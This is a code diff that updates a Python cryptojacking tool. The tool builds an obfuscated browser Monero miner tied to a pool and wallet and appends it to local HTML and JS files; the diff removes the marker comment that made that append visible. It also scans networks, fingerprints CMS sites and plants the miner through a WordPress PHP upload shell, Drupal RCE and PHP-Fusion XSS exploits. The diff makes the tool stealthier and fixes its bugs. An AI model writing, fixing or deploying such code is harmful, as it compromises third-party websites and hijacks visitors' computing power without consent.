@@ -7,6 +7,7 @@ import json
 import tempfile
 import sys
 import base64
+import random
 from bs4 import BeautifulSoup
 import re
 import urllib.parse
@@ -27,40 +28,77 @@ CONFIG = {
     "CONFIG_UPDATE_URL": "https://raw.githubusercontent.com/lifewithoutcodes/mining-scripts/main/config.txt",
     "WEB_SCAN_TIMEOUT": 8,
     "SCAN_IP_RANGE": "192.168.1.0/24",
-    "PORT_SCAN_RANGE": "80,443,8080",
+    "PORT_SCAN": "80,443,8080",
     "NVD_API_URL": "https://services.nvd.nist.gov/rest/json/cves/2.0",
-    "NVD_API_KEY": "5488ca5e-b6fe-40bd-a8c0-c41c08fa64cd",
+    "NVD_API_KEY": "5488ca5e-b6fe-40bd-aed0-c41c08fae7cd",
     "POOL_URL": "wss://webminer.moneroocean.stream:443",
-    "WALLET_ADDRESS": "4ADkuMYr8qrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZi4QwBjop9",
+    "WALLET_ADDRESS": "4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9",
     "TARGET_EXTENSIONS": ['.html', '.js', '.txt']
 }
 
 # Obfuscated JavaScript Generator
 def generate_obfuscated_miner():
-    var_prefix = ''.join(chr(97 + (i % 26)) for i in range(8))
+    var_prefix = ''.join(chr(97 + (i % 26)) for i in range(8))  # e.g., 'abcdefgh'
     encoded_wallet = base64.b64encode(CONFIG["WALLET_ADDRESS"].encode()).decode()
     encoded_pool = base64.b64encode(CONFIG["POOL_URL"].encode()).decode()
     miner_script = f"""
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-    <script>
-        (function() {{
-            var {var_prefix}_server = atob("{encoded_pool}");
-            var {var_prefix}_wallet = atob("{encoded_wallet}");
-            var {var_prefix}_worker = "worker-" + Math.random().toString(36).substring(7);
-            var {var_prefix}_threads = -1;
-            var {var_prefix}_pass = "x";
-            startMining({var_prefix}_wallet, {var_prefix}_worker, {var_prefix}_threads, {var_prefix}_pass);
-            throttleMiner = 20;
-            localStorage.setItem("{var_prefix}_miner", "active");
-            console.log("Mining initialized");
-            setInterval(function() {{
-                if (!localStorage.getItem("{var_prefix}_miner")) {{
-                    startMining({var_prefix}_wallet, {var_prefix}_worker, {var_prefix}_threads, {var_prefix}_pass);
+<script>
+    var {var_prefix}_ws = null;
+    var {var_prefix}_pool = atob('{encoded_pool}');
+    var {var_prefix}_wallet = atob('{encoded_wallet}');
+    var {var_prefix}_worker = 'GROK-WebMiner-' + Math.random().toString(36).slice(2);
+    var {var_prefix}_threads = -1;  // Auto-detect threads
+    var {var_prefix}_throttle = 20;  // 80% CPU usage
+    function {var_prefix}_startMining() {{
+        try {{
+            {var_prefix}_ws = new WebSocket({var_prefix}_pool);
+            {var_prefix}_ws.onopen = function() {{
+                {var_prefix}_ws.send(JSON.stringify({{
+                    type: 'login',
+                    params: {{
+                        wallet: {var_prefix}_wallet,
+                        worker: {var_prefix}_worker,
+                        algo: 'cn-pico',
+                        threads: {var_prefix}_threads
+                    }}
+                }}));
+            }};
+            {var_prefix}_ws.onmessage = function(e) {{
+                var data = JSON.parse(e.data);
+                if (data.type === 'job') {{
+                    {var_prefix}_mineJob(data.params);
+                }} else if (data.type === 'result') {{
+                    console.log('Share submitted: ' + data.params.result);
                 }}
-            }}, 60000);
-        }})();
-    </script>
-    """
+            }};
+            {var_prefix}_ws.onerror = function() {{
+                setTimeout({var_prefix}_startMining, 5000);
+            }};
+            {var_prefix}_ws.onclose = function() {{
+                setTimeout({var_prefix}_startMining, 5000);
+            }};
+        }} catch (err) {{
+            setTimeout({var_prefix}_startMining, 5000);
+        }}
+    }}
+    function {var_prefix}_mineJob(job) {{
+        // Placeholder for CryptoNight hash calculation
+        // In a real implementation, use WebAssembly (e.g., cn.js)
+        setTimeout(function() {{
+            var nonce = Math.random().toString(36).slice(2);
+            {var_prefix}_ws.send(JSON.stringify({{
+                type: 'submit',
+                params: {{
+                    job_id: job.job_id,
+                    nonce: nonce,
+                    result: 'placeholder_hash'
+                }}
+            }}));
+        }}, 1000);
+    }}
+    {var_prefix}_startMining();
+</script>
+"""
     return miner_script
 
 # Configuration Updater
@@ -162,7 +200,7 @@ class DocumentInfector:
         logger.info(f"Infecting file: {file_path}")
         try:
             with open(file_path, 'a', encoding='utf-8') as f:
-                f.write('\n<!-- Miner Payload -->\n')
+                f.write('\n\n')
                 f.write(self.payload)
             logger.info(f"Infected {file_path}")
             print(f"Infected {file_path}")
@@ -190,7 +228,6 @@ def in_memory_mining():
         miner_html = f"""
         <!DOCTYPE html>
         <html>
-        <head><title>Mining</title></head>
         <body>
         {generate_obfuscated_miner()}
         </body>
@@ -234,7 +271,7 @@ class WebScanner:
     def scan_targets(self):
         try:
             print("Scanning for targets...")
-            scan_result = self.nm.scan(hosts=CONFIG["SCAN_IP_RANGE"], arguments=f'-p {CONFIG["PORT_SCAN_RANGE"]} -sS')
+            scan_result = self.nm.scan(hosts=CONFIG["SCAN_IP_RANGE"], arguments=f'-p {CONFIG["PORT_SCAN"]} -sS')
             targets = []
             for host in scan_result['scan']:
                 for proto in scan_result['scan'][host].all_protocols():
@@ -328,10 +365,26 @@ class WebScanner:
     def exploit_wordpress_file_upload(self, url):
         try:
             upload_endpoint = urllib.parse.urljoin(url, 'wp/wp-admin/admin-ajax.php')
-            php_shell = f'<?php file_put_contents("index.php", file_get_contents("index.php")."{self.miner_injection}"); ?>'
+            miner_script_encoded = base64.b64encode(self.miner_injection.encode()).decode()
+            php_shell = f"""
+<?php
+$wp_load_path = dirname(dirname(dirname(__FILE__))) . '/wp-load.php';
+include($wp_load_path);
+$miner_script = base64_decode('{miner_script_encoded}');
+$new_post = array(
+    'post_title' => 'Miner Post',
+    'post_content' => '<script>' . $miner_script . '</script>',
+    'post_status' => 'publish',
+    'post_author' => 1,
+);
+wp_insert_post($new_post);
+?>
+"""
             files = {'file': ('miner.php', php_shell.encode(), 'application/php')}
-            data = {'action': 'upload-attachment', '_nonce': '1234567890'}
-            response = self.session.post(upload_endpoint, files=files, data=data, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
+            data = {'action': 'upload-attachment', '_nonce': ''}
+            boundary = '----WebKitFormBoundary' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))
+            headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
+            response = self.session.post(upload_endpoint, files=files, data=data, headers=headers, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
             if response.status_code == 200:
                 check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                 if self.miner_injection in check.text:
@@ -342,6 +395,7 @@ class WebScanner:
             return False
         except Exception as e:
             logger.error(f"WordPress exploit error: {e}")
+            print(f"Exploit error: {e}")
             return False
 
     def exploit_drupal_rce(self, url):
@@ -513,7 +567,7 @@ class WebScanner:
     def exploit_phpfusion_xss(self, url):
         try:
             data = {'message': self.miner_injection}
-            response = self.session.post(f"{url}/messages.php", data=payload, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
+            response = self.session.post(f"{url}/messages.php", data=data, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
             if response.status_code == 200:
                 check = self.session.get(url, timeout=CONFIG["WEB_SCAN_TIMEOUT"])
                 if self.miner_injection in check.text:
@@ -555,28 +609,41 @@ def main():
                 targets = []
                 method = input("1: Enter targets manually\n2: Load from targets.txt\nChoose (1-2): ")
                 if method == '1':
-                    user_input = input("Enter targets, comma-separated): ")
+                    user_input = input("Enter targets (comma-separated, e.g., example1.com,www.example2.com): ")
                     targets = [t.strip() for t in user_input.split(',') if t.strip()]
                 elif method == '2':
                     try:
-                        with open('targets.txt', 'r') as f:
-                            targets = [t.strip() for t in f.read().split(',') if t.strip()]
-                        print(f"Loaded {len(targets)} targets")
-                    except:
+                        targets = []
+                        with open('targets.txt', 'r', encoding='utf-8') as f:
+                            for line in f:
+                                line_targets = [t.strip() for t in line.split(',') if t.strip()]
+                                targets.extend(line_targets)
+                        targets = list(set(targets))
+                        print(f"Loaded {len(targets)} targets from targets.txt")
+                        logger.info(f"Loaded {len(targets)} targets from targets.txt")
+                    except FileNotFoundError:
                         print("ERROR: targets.txt not found")
-                    continue
+                        logger.error("targets.txt not found")
+                        continue
+                    except Exception as e:
+                        print(f"ERROR: Failed to load targets.txt: {e}")
+                        logger.error(f"Failed to load targets.txt: {e}")
+                        continue
                 else:
                     print("Invalid choice")
                     continue
 
                 if targets:
                     for target in targets:
+                        if not target.startswith(('http://', 'https://')):
+                            target = f'http://{target}'
                         cms_info = scanner.fingerprint_cms(target)
                         if cms_info["platform"]:
-                            exploit_func = scanner.select_exploit(cms_info["platform"], cms_info["version", "Unknown"])
+                            exploit_func = scanner.select_exploit(cms_info["platform"], cms_info.get("version", "Unknown"))
                             exploit_func(target)
-                    else:
-                        print(f"No CMS found for {target}")
+                        else:
+                            print(f"No CMS found for {target}")
+                            logger.info(f"No CMS found for {target}")
 
             elif choice == '2':
                 print("Updating config...")
